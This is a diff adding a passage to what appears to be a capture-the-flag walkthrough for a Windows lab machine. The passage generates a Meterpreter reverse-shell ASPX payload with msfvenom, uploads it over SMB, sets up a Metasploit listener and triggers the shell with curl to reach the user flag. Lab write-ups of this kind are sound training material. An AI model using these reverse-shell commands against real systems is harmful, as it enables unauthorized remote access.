@@ -24,3 +24,34 @@ using searchploit we can get eternalblue exploit.
 lets mirror windows server 2016 exploit to current working dir.
 
 [searchsploit -m ]
+
+# first step
+
+i went for this step. it seems easy. i created a revese shell using msfvenom and uploaded it to smb share and triggered it using web. 
+creating the reverse shell. 
+
+[msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.8.50.72 lport=4444 -f aspx -o shell.aspx]
+
+put the shell in shares. 
+[smbclient //ip/sharename] then [put shell.aspx]
+
+creating the listner 
+
+[kali@kali:/data/vpn$ msfconsole -q
+msf5 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf5 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
+payload => windows/x64/meterpreter_reverse_tcp
+msf5 exploit(multi/handler) > set lhost 10.8.50.72
+lhost => 10.8.50.72
+msf5 exploit(multi/handler) > set lport 4444
+lport => 4444
+msf5 exploit(multi/handler) > run]
+
+triggering the shell.aspx
+
+[curl http://ip:49663/sharename/shell.aspx]
+
+then it will connect to the server. go to the bob desktop. there will be the user flag. 
+
+[cd c:/users/bob/Desktop]
